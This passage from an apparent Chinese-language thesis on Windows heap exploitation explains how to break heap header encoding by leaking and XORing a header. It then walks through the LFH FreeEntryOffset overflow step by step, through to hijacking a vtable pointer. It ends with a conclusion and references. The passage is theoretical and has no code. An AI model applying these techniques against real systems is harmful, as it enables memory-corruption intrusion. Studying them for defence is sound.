突破堆头编码</h3><p>在该阶段加入的众多安全机制中，堆头编码机制有着关键性的地位。在之前介绍的多种漏洞利用方式中，几乎都是以相邻前一堆块溢出作为前提。在前一阶段版本中，可通过多次碰撞仅1字节的Heap Cookie，从而绕过安全机制覆盖到堆头的敏感信息。而在本阶段版本中该机制的引入，导致堆头信息皆被编码，阻断了对堆头敏感信息的篡改，以及对后方前项、后项指针的覆盖，几乎阻绝了上文中介绍的所有攻击方式。</p><p>但通过分析堆头编码的算法，如图38所示，可以发现堆头的敏感信息是通过异或进行编码，并且异或运算可逆。如果我们拥有一次泄露的机会，可将已知状态堆块编码后的堆头泄露出来，并且由于我们已知堆块状态，即前3字节，通过逐字节异或可计算出第4字节的SmallTagIndex字段，再用前4字节与泄露出的编码后堆头相异或即可得到HeapBase-&gt;Coding的值。</p><p>虽说对堆头编码的突破严格上来说并不算是漏洞的利用，但是通过突破堆头编码所得到的HeapBase-&gt;Encoding字段可在利用其他漏洞时对构造堆头进行编码，从而绕过堆头编码的检测。可以说突破堆头编码使得上文中提到的多种攻击方式有了一线生机。</p><h3 id="4-5-2-LFH-FreeEntryOffset-OverFlow"><a href="#4-5-2-LFH-FreeEntryOffset-OverFlow" class="headerlink" title="4.5.2 LFH FreeEntryOffset OverFlow"></a>4.5.2 LFH FreeEntryOffset OverFlow</h3><h4 id="4-5-2-1-漏洞成因"><a href="#4-5-2-1-漏洞成因" class="headerlink" title="4.5.2.1 漏洞成因"></a>4.5.2.1 漏洞成因</h4><p>如上文介绍的，在该阶段版本中新引入的前端堆管理器LFH中，由其管理的每个空闲堆块用户区前2字节都存储着可以用于更新FreeEntryOffset字段的Offset值。而FreeEntryOffset字段在前端堆管理器分配堆时起着极为重要的寻址作用。</p><p>在突破堆头编码后，由前端堆管理器管理的空闲堆块用户区上前2字节的Offset显得脆弱不堪，十分容易被覆盖，导致前端堆管理器分配时被劫持，极易形成漏洞。</p><h4 id="4-5-2-2-利用方式"><a href="#4-5-2-2-利用方式" class="headerlink" title="4.5.2.2 利用方式"></a>4.5.2.2 利用方式</h4><p>在介绍该漏洞利用方式之前，首先将_INTERLOCK_SEQ结构体中关键字段在堆块分配和释放时的具体操作进行详细介绍。接下来以BlockSize为6，即0x30字节的UserBlock为例进行讲解。</p><p>首先在该大小UserBlock刚被初始化时，会将FreeEntryOffset字段初始化为0x2，原因是在第一个堆块前会有0x10字节大小的_HEAP_USERDATA_HEADER结构；Depth字段会通过当前可用内存量(UserDataAllocSize)运算出该大小堆块的总个数，即Depth=(UserDataAllocSize-sizeof(_HEAP_USERDATA_HEADER)/BlockSize，在本例中假设为0x2A。初始化的堆块如图41所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-f27b0e0664b16a0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图41 LFH FreeEntryOffset OverFlow(1)"></p><p>此时申请第一个0x28字节大小堆块时(含堆头共0x30字节)，会通过前端堆管理器将FreeEntryOffset字段所指的堆块分配发给用户使用，同时将FreeEntryOffset更新为用户区前2字节存放的用于寻址下一堆块的Offset，并将Depth的值-1。分配后堆块结构如图42所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-f4ad851877dcce87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图42 LFH FreeEntryOffset OverFlow(2)"></p><p>同理。在第三次申请完0x28字节大小的堆块后堆块结构如图43所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-9d26853feecf0b8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图43 LFH FreeEntryOffset OverFlow(3)"><br>/v:imagedata&gt;</v:shape></p><p>此时若将第二次申请的堆块释放掉，则会将FreeEntryOffset当前的值存放到该释放堆块的前两字节作为Offset，并通过该堆块与_HEAP_USERDATA_HEADER的相对block偏移更新FreeEntryOffset字段，再将Depth的值+1。释放第二个堆块后的堆块结构如图44所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-5f6435c562b0a711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图44 LFH FreeEntryOffset OverFlow(4)"></p><p>通过示例不难发现，空闲堆块前2字节Offset值在前端堆管理器分配和释放堆块算法中的重要性，若能够通过堆溢出将其覆盖为含有虚表函数指针对象的堆块偏移，就能够通过申请堆块拿到该对象的使用权，并修改虚表指针劫持程序控制流。</p><p>承接上例所述，构造漏洞利用场景如下：第一个堆块作为可由用户控制的存在堆溢出的用户堆块，第三个堆块作为含有虚表函数指针对象的占用堆块。如图45所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-ea8f0ff1815acb54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图45 LFH FreeEntryOffset OverFlow(5)"></p><p>此时，对用户堆块进行编辑，导致第二个空闲堆块前2字节存放的Offset的值被用户对快溢出所覆盖，并修改值为0xE，即第三个对象堆块的偏移。如图46所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-01720b12a575e451.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图46 LFH FreeEntryOffset OverFlow(6)"></p><p>紧接着，申请大小为0x28的堆块，前端堆管理器会按照算法将FreeEntryOffset更新为伪造的Offset即0xE。如图47所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-be211d6701610bef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图47 LFH FreeEntryOffset OverFlow(7)"></p><p>再次申请大小为0x28字节的堆块时，前端堆管理器会按照算法将对象堆块分配给用户使用，并将FreeEntryOffset更新为Vtable_ptr的前2字节。如图48所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-695f17612a04ada1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图48 LFH FreeEntryOffset OverFlow(8)"></p><p>最终，会有2指针指向第3个堆块，一个用户指针，一个对象指针，通过编辑用户指针可覆盖虚表函数指针为任意地址，最后调用对象指针执行篡改后的虚表指针达到漏洞利用。</p><h1 id="五、-总结与展望"><a href="#五、-总结与展望" class="headerlink" title="五、 总结与展望"></a>五、 总结与展望</h1><p>本文从堆管理视图出发，将Windows7操作系统及之前的系统版本分为三个阶段，分阶段按照重要结构、堆块操作、保护机制及漏洞利用五个部分进行了详细的讲解，并在一些较难理解的关键部分佐以图片进行辅助讲解。</p><p>在第一部分的环境准备中，主要对在研究当前阶段版本中堆管理所采用的环境进行了说明；在第二部分的重要结构中，主要对当前阶段版本中堆管理所涉及到的重要数据结构进行了详细讲解；在第三部分的堆块操作中，主要对当前阶段版本中堆管理所涉及到的分配、释放及合并等操作的算法进行了详细讲解；在第四部分的保护机制中，主要对当前阶段版本中堆管理所涉及到的系统新增加的安全保护机制进行了详细讲解；在第五部分漏洞利用中，主要对当前阶段版本中堆管理所涉及到的典型堆漏洞的产生原理以及利用方式进行了详细讲解。</p><p>总的来看，本文对Windows下典型堆漏洞产生原理及利用方法的研究不够深入彻底，仍存在部分盲区。如本文在操作系统的阶段划分中不够全面，未覆盖到Windows最新的Windows 8 – Windows 10这一阶段；以及在漏洞利用部分的讲解中，仅仅挑选了较为常见、应用较广泛的漏洞，对漏洞种类研究的不够全面；而且对典型堆漏洞的阐述仅仅停留在了理论层次，缺少本地Demo复现以及实际漏洞分析进行实践佐证，导致对漏洞的存在和利用缺乏说服力。</p><p>由于本人的学识有限，在文中难免存在错误，望海涵并及时指正。虽说论文已经结束，但学习却永无止境，今后应该针对上方的总结对症下药，完成好对Windows下典型堆漏洞产生原理及利用方法的进一步研究。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] John Mcdonald,Chris Valasek. Practical Windows XP/2003 Heap Exploitation[EB/OL].<a href="https://www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf,2009" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf,2009</a>.</p><p>[2] Moore,Brett. Exploiting Freelist[0] on XP Service Pack 2[EB/OL].<a href="http://www.insomniasec.com/publications/Exploiting_Freelist%5B0%5D_On_XPSP2.zip,2005-12" target="_blank" rel="noopener">http://www.insomniasec.com/publications/Exploiting_Freelist%5B0%5D_On_XPSP2.zip,2005-12</a>.</p><p>[3] Chris Valasek. Understanding the Low Fragmentation Heap[EB/OL].<a href="http://illmatics.com/Understanding_the_LFH_Slides.pdf,2010-07" target="_blank" rel="noopener">http://illmatics.com/Understanding_the_LFH_Slides.pdf,2010-07</a>.</p><p>[4] Ben Hawkes. Attacking the Vista Heap[EB/OL].<a href="https://www.lateralsecurity.com/downloads/hawkes_ruxcon-nov-2008.pdf,2008-11" target="_blank" rel="noopener">https://www.lateralsecurity.com/downloads/hawkes_ruxcon-nov-2008.pdf,2008-11</a>.</p><p>[5] coneco. 读后感之“Understanding the LFH”[EB/OL].<a href="https://bbs.pediy.com/thread-248443.htm,2018-12-16" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248443.htm,2018-12-16</a>.</p><p>[6] Magictong. Heap Spray原理浅析[EB/OL].<a href="https://blog.csdn.net/magictong/article/details/7391397,2012-03" target="_blank" rel="noopener">https://blog.csdn.net/magictong/article/details/7391397,2012-03</a>.</p><p>[7] 王清,张东辉.0day安全：软件漏洞分析技术(第2版)[M].电子工业出版社:北京,2011-06:144.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
